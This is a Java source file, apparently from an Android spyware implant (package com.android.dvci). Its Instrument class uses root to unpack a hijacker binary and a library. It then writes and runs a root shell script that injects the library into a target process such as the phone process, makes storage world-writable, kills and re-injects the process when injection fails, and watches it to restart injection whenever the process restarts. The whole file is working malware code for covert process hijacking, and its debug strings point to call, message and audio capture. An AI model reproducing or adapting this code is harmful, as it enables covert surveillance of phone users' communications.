package com.android.dvci.util;

import com.android.dvci.Beep;
import com.android.dvci.Root;
import com.android.dvci.Status;
import com.android.dvci.auto.Cfg;
import com.android.dvci.evidence.EvidenceBuilder;
import com.android.dvci.file.AutoFile;
import com.android.dvci.file.Path;
import com.android.mm.M;

import java.io.File;
import java.util.Date;
import java.util.concurrent.Semaphore;
import java.util.concurrent.TimeUnit;


/*
 * todo: migliorare l'inserimento dell'instrumentation, gestione degli stati e degli errori
 */
public class Instrument implements Runnable{
	private static final String TAG = "Instrument";
	private static final int MAX_KILLED = 5;
	private String proc_owner = null;
	private String dex_dest = null;
	private String proc;
	private PidMonitor pidMonitor;
	private String lib_dest, hijacker, path, dumpPath, dexFile, libInAsset;
	private static String storage = "";
	private Semaphore sync_semaphore =null;
	private Thread monitor;
	private int killed = 0;
	private int restartedCounter = 0;
	private boolean started = false;
	private String instrumentationSuccessDir = null;
	private boolean watcherContinue = false;
	private boolean threadRunning = false;
	private Thread thread = null;


	public Instrument(String process, String dump,Semaphore sem,String library,String owner) {
		final File filesPath = Status.getAppContext().getFilesDir();
		proc = process;
		proc_owner = owner;
		hijacker = String.valueOf(Math.abs((int)Utils.getRandom()))+"m";
		libInAsset = library;
		lib_dest = String.valueOf(Math.abs((int)Utils.getRandom()));
		path = filesPath.getAbsolutePath();
		dumpPath = dump;
		sync_semaphore = sem;
	}
	public Instrument(String process, String dump,Semaphore sem,String library,String _dexFile,String owner) {
		this(process,dump,sem,library,owner);
		if(dex_dest!=null) {
			dexFile = _dexFile;
			dex_dest = "d" + dexFile.hashCode() + ".dex";
		}
	}

	public Instrument(String process, String dump, Semaphore sem, String library) {
		this(process,dump,sem,library,null);
	}

	public String getInstrumentationSuccessDir() {
		return instrumentationSuccessDir+"/";
	}

	public void setInstrumentationSuccessDir(String storageDirName,boolean autoCreate) {
		this.instrumentationSuccessDir = storageDirName;
		if(autoCreate) {
			createMsgStorage();
		}
	}

	public boolean createMsgStorage() {
		// Create storage directory

		if (Path.createDirectory(this.instrumentationSuccessDir) == false) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (createMsgStorage): audio storage directory cannot be created"); //$NON-NLS-1$
			}

			return false;
		} else {
			Execute.chmod(M.e("777"), this.instrumentationSuccessDir);

			if (Cfg.DEBUG) {
				Check.log(TAG + " (createMsgStorage): audio storage directory created at " + this.instrumentationSuccessDir); //$NON-NLS-1$
			}

			return true;
		}
	}
	public boolean isStarted() {
		return started;
	}

	private boolean deleteHijacker() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (installHijacker) delete lib_dest");
		}
		AutoFile file = new AutoFile(Status.getAppContext().getFilesDir(), lib_dest);
		file.delete();
		file = new AutoFile(Status.getAppContext().getFilesDir(), hijacker);
		file.delete();
		return true;
	}

	private boolean installHijacker() {
		try {
			if (!Status.haveRoot()) {
				if (Cfg.DEBUG) {
					Check.log(TAG + "(installHijacker): Nope, we are not root");
				}

				return false;
			}

			Utils.dumpAsset(libInAsset, lib_dest);
			Utils.dumpAsset(M.e("mb.data"), hijacker);
			if(dexFile!= null){
				File src = new File(path + "/" + dex_dest);
				Utils.dumpAsset(dexFile, dex_dest);
				Execute.chmod(M.e("750"), path + "/" + dex_dest);
				Utils.copy(src,new File(dumpPath + "/" + dex_dest));
				Execute.chmod(M.e("777"), dumpPath + "/" + dex_dest);
				src.delete();
			}

			// Install library
			Execute.chmod(M.e("666"), path + "/" + lib_dest);
			Execute.chmod(M.e("750"), path + "/" + hijacker);
			if(getInstrumentationSuccessDir()== null) {
				setInstrumentationSuccessDir(dumpPath,true);
			}

		} catch (Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			return false;
		}

		return true;
	}
	public boolean startInstrumentation() {
		return startInstrumentation(180);
	}
	public boolean startInstrumentation(int timeout)  {
		if ( timeout<=0 ){
			timeout = 180;
		}
		Date start = new Date();
		long diff_sec = 0;
		while(diff_sec<timeout && killed < MAX_KILLED) {
			if( _startInstrumentation()  ){
				if (Cfg.DEBUG) {
					Check.log(TAG + "(startInstrumentation): "+ proc +" Done");
				}
				break;
			}
			if (Cfg.DEBUG) {
				Check.log(TAG + "(startInstrumentation): "+proc+" failed, try again");
			}
			Utils.sleep(500);
			diff_sec = (new Date().getTime() - start.getTime()) / 1000;
		}
		if(diff_sec>timeout) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(startInstrumentation): " + proc + "Time out sec=" + timeout);
			}
		}

		return isStarted();
	}

	public boolean _startInstrumentation() {
		if (!Status.haveRoot()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(_startInstrumentation): Nope, we are not root");
			}

			return false;
		}
		if(killed > MAX_KILLED){
			if (Cfg.DEBUG) {
				Check.log(TAG + "(_startInstrumentation): too many trials");
			}
			return false;
		}
		if (!installHijacker()) {
			return false;
		}


		try {
			if(sync_semaphore == null || sync_semaphore.tryAcquire(Utils.getRandom(10), TimeUnit.SECONDS)) {
				try {
					int pid = getProcessPid(proc, proc_owner);

					if (pid > 0) {
						// Run the injector
						String scriptName = String.valueOf(Math.abs((int)Utils.getRandom()))+"ij";
						String script = M.e("#!/system/bin/sh") + "\n";
						script += M.e("rm ")+ getInstrumentationSuccessDir() +M.e("*.cnf") + "\n";

						String farg =" ";
						if( !StringUtils.isEmpty(dumpPath)) {
							farg += "-f " + dumpPath;
							if ( !StringUtils.isEmpty(dexFile)) {
								farg += dex_dest + "\n";
							}
						}
						script += path + "/" + hijacker + " -p " + pid + " -l " + path + "/" + lib_dest + farg ;
						if (Cfg.DEBUG) {
							script += " -d ";
						}
						script += "\n";
						Root.createScript(scriptName, script);
						ExecuteResult ret = Execute.executeRoot(path + "/" + scriptName);
						if (Cfg.DEBUG) {
							Check.log(TAG + " (startInstrumentation) "+proc+" output: ");
							for( String s : ret.stdout )
							{
								Check.log(TAG + s);
							}
							Check.log(TAG + " (startInstrumentation) "+proc+" exit code: " + ret.exitCode);
						}

						Root.removeScript(scriptName);

						Utils.sleep(2000);
						int newpid = getProcessPid(proc,proc_owner);
						if (newpid != pid) {
							if (Cfg.DEBUG) {
								Check.log(TAG + " (_startInstrumentation) Error: "+proc+" was killed");
							}
							return false;
						}

						File d = new File(getInstrumentationSuccessDir());

						started = false;

						for (int i = 0; i < 5 && !started; i++) {
							File[] files = d.listFiles();
							if ( files == null ){
								break;
							}
							for (File file : files) {
								if (file.getName().endsWith(M.e(".cnf"))) {
									if (Cfg.DEBUG) {
										Check.log(TAG + " (_startInstrumentation) got file: " + file.getName());
									}
									started = true;
									file.delete();

									if (Cfg.DEMO) {
										Beep.beep();
									}
								}

							}
							if (!started) {
								if (Cfg.DEBUG) {
									Check.log(TAG + " (_startInstrumentation) sleep 1 secs "+proc);
								}
								Utils.sleep(1000);
							}
						}
						if (started) {
							if (Cfg.DEBUG) {
								Check.log(TAG + " (_startInstrumentation) "+proc+" Hijack installed");
							}
							EvidenceBuilder.info(proc + M.e(" injected"));
							checkProcessMonitor(true);
						}else if ( killed < MAX_KILLED) {
							if (Cfg.DEBUG) {
								Check.log(TAG + " (_startInstrumentation) Kill "+proc);
							}
							killProc(proc);
							killed += 1;
						}
					} else {
						if (Cfg.DEBUG) {
							Check.log(TAG + "(_startInstrumentation): unable to get pid for "+ proc);
						}
					}
				} catch (Exception e) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (_startInstrumentation) Error: "+ proc , e);
					}
					return false;
				} finally {
					deleteHijacker();
					Utils.sleep(2000);
					if(sync_semaphore != null) {
						sync_semaphore.release();
					}
				}
			}else{
				return false;
			}
		} catch (InterruptedException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (_startInstrumentation) Error: "+proc + e);
			}
			return false;
		}

		return started;
	}

	public void stopInstrumentation() {

		int trials=MAX_KILLED;
		int pid_start = getProcessPid(proc,proc_owner);
		int pid_stop = pid_start;
		if ( pidMonitor != null ){
			pidMonitor.setStopMonitor(true);
		}

		while(trials-->0 && pid_start==pid_stop) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (stopInstrumentation "+proc+") trials: " + trials);
			}

			try {
				if(sync_semaphore != null) {
					sync_semaphore.tryAcquire(Utils.getRandom(10), TimeUnit.SECONDS);
					try {
						killProc(proc);
					} finally {
							sync_semaphore.release();
					}
				}else{
					killProc(proc);
				}

			} catch (InterruptedException e) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (stopInstrumentation "+proc+") Error: " + e);
					Check.log(TAG + " (stopInstrumentation "+proc+") Interrupted when trying to restore "+ proc);
				}
			}
			pid_stop = getProcessPid(proc,proc_owner);
		}
		if(pid_start != pid_stop){
			started = false;
		}
		monitor = null;
	}

	private int getProcessPid(String process,String proc_owner) {
		int pid = -1;
		String pid_s = Utils.pidOf(process, proc_owner);
		if(pid_s != null){
			try{
				pid = Integer.valueOf(pid_s);
			}catch (Exception e){
				pid=-1;
			}
		}
		return pid;
	}

	public void killProc(String process) {
		try {
			int pid = getProcessPid(process,proc_owner);
			if (Cfg.DEBUG) {
				Check.log(TAG + " (killProc) try to kill " + pid);
			}
			Execute.executeRoot("kill " + pid);
		} catch (Exception ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (killProc) Error: " + ex);
			}
		}
	}

	public void checkProcessMonitor(boolean initialize) {
		int newpid = 0;
		if (Cfg.DEBUG) {
			Check.log(TAG + "(checkProcessMonitor): initialize " + initialize);
		}
		if (initialize ) {
			newpid = getProcessPid(proc, proc_owner);
		}
		if (pidMonitor == null) {
			newpid = getProcessPid(proc, proc_owner);
			if (Cfg.DEBUG) {
				Check.log(TAG + "(checkProcessMonitor): Starting "+proc+ " Monitor thread");
			}
			pidMonitor = new PidMonitor(newpid);
			monitor = new Thread(pidMonitor);
			monitor.start();
		} else {
			if( initialize) {
				pidMonitor.setPid(newpid);
			}else{
				if( monitor ==null && monitor.getState() == Thread.State.TERMINATED ){
					if (Cfg.DEBUG) {
						Check.log(TAG + "(checkProcessMonitor): pid not null but thread terminated ! set is to null");
					}
					pidMonitor.setStopMonitor(false);
					pidMonitor.setPid(newpid);
					monitor = new Thread(pidMonitor);
					monitor.start();
				}
			}

		}
	}

	public int getRestartCounter() {
		return restartedCounter;
	}

	public void setRestartCounter(int counter) {
		restartedCounter = counter;
	}

	/**
	 * Indicates if the main thread is running
	 * @return threadRunning
	 */

	public synchronized boolean isThreadRunning() {
		return threadRunning ;
	}

	public synchronized void setThreadRunning(boolean threadRunning) {
		this.threadRunning = threadRunning;
	}

	public void stop() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (stop): starting"); //$NON-NLS-1$
		}
		if( Status.haveRoot() && this.thread != null) {
			watcherContinue = false;
			Date start = new Date();
			long diff_sec = (new Date().getTime() - start.getTime()) / 1000;
			while (diff_sec < 60) {
				diff_sec = (new Date().getTime() - start.getTime()) / 1000;
				try {
					this.thread.join(500);
					if (Cfg.DEBUG) {
						Check.log(TAG + " (stop): join return ts="+ this.thread.getState()); //$NON-NLS-1$
					}
					if(this.thread.getState() == Thread.State.TERMINATED) {
						if (Cfg.DEBUG) {
							Check.log(TAG + " (stop): joined "); //$NON-NLS-1$
						}
						this.thread = null;
							if (isStarted()) {
								if (Cfg.DEBUG) {
									Check.log(TAG + " (stop): something wrong instrumentation still active, stop it"); //$NON-NLS-1$
								}
								stopInstrumentation();
							}
						break;
					}
				} catch (Exception e) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (stop): failed to join thread"); //$NON-NLS-1$
					}
				}
				Utils.sleep(500);
			}
			if(isThreadRunning()){
				if (Cfg.DEBUG) {
					Check.log(TAG + " (stop): failed to stop thread"); //$NON-NLS-1$
				}
				EvidenceBuilder.info(M.e("OOB failed to stop"));
			}else{
				if (Cfg.DEBUG) {
					Check.log(TAG + " (stop): OK"); //$NON-NLS-1$
				}
				EvidenceBuilder.info(M.e("OOB correctly stopped"));

			}
		}
	}
	@Override
	public void run() {
		setThreadRunning(true);
		while(watcherContinue ) {
			if (Status.haveRoot()) {
				if (! isStarted()) {
					startInjection();
				}else {
					checkProcessMonitor(false);
				}
			}
			if(killed>=MAX_KILLED){
				if (Cfg.DEBUG) {
					Check.log(TAG + "(run): too many kill stopping..");
					watcherContinue = false ;
				}
			}
			Utils.sleep(5000);
		}
		if (Cfg.DEBUG) {
			Check.log(TAG + "(run): asked to stop");
		}
		try {
			stopInstrumentation();
		}catch (Exception e){
			if (Cfg.DEBUG) {
				Check.log(TAG + "(run): failed to stopInstrumentation");
			}
		}
		setThreadRunning(false);
	}


	public void start() {

		if (isThreadRunning()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(start): thread ALREADY running");
			}
		} else {
			watcherContinue = true;
			if (thread == null) {
				thread = new Thread(this);
			}
			if (Cfg.DEBUG) {
				Check.log(TAG + "(start): starting thread");
			}
			thread.start();
		}
	}

	public  boolean startInjection() {
		/*
		 * Hypothesis : modules that relay on the com.android.phone , i.e. ModuleMessages, ModuleCall can have problem
		 * in case the process is killed while used?
		 */
		if(killed < MAX_KILLED) {
			stopInstrumentation();
			if (isStarted()) {
				if (Cfg.DEBUG) {
					Check.log(TAG + "(actualStart): hijacker already running");
				}
				return true;
			}
			if (startInstrumentation()) {
				if (Cfg.DEBUG) {
					Check.log(TAG + "(actualStart): hijacker successfully installed");
				}
				EvidenceBuilder.info(M.e("OOB ready"));
				return true;
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + "(actualStart): hijacker cannot be installed");
				}
				//EvidenceBuilder.info(M.e("OOB cannot be installed"));
			}
		}else{
			if (Cfg.DEBUG) {
				Check.log(TAG + "(actualStart): hijacker cannot be installed too many trials");
			}
			EvidenceBuilder.info(M.e("OOB cannot be installed,too many trials"));
		}
		return false;
	}


	class PidMonitor implements Runnable {
		private int cur_pid, start_pid;
		private int failedCounter = 0;
		private boolean stopMonitor = false;

		public void setStopMonitor(boolean stopMonitor) {
			this.stopMonitor = stopMonitor;
		}

		public void setPid(int pid) {
			start_pid = pid;
		}

		public PidMonitor(int pid) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(PidMonitor): starting with pid " + pid + "for proc=" + proc);
			}
			stopMonitor = false;
			setPid(pid);
		}

		@Override
		public void run() {
			while (true) {
				if (Cfg.DEBUG) {
					Check.log(TAG + "(PidMonitor "+ proc +" run): killed="+ killed +" restarted="+ restartedCounter);
				}

				if (stopMonitor) {
					if (Cfg.DEBUG) {
						Check.log(TAG + "(PidMonitor "+proc+" run): closing monitor thread");
					}

					stopMonitor = false;
					return;
				}

				cur_pid = getProcessPid(proc,proc_owner);

				// process died
				if (cur_pid != start_pid) {
					if (Cfg.DEBUG) {
						Check.log(TAG + "(PidMonitor "+proc+" run): died, restarting instrumentation");
					}

					failedCounter += 1;
					if (failedCounter < MAX_KILLED) {
						startInstrumentation();
						restartedCounter++;
					} else {
						if (Cfg.DEBUG) {
							Check.log(TAG + "(PidMonitor "+proc+" run): too many retry, stop restarting ");
						}
					}
				} else {
					failedCounter = 0;
				}

				Utils.sleep(10000);
			}
		}
	}
}
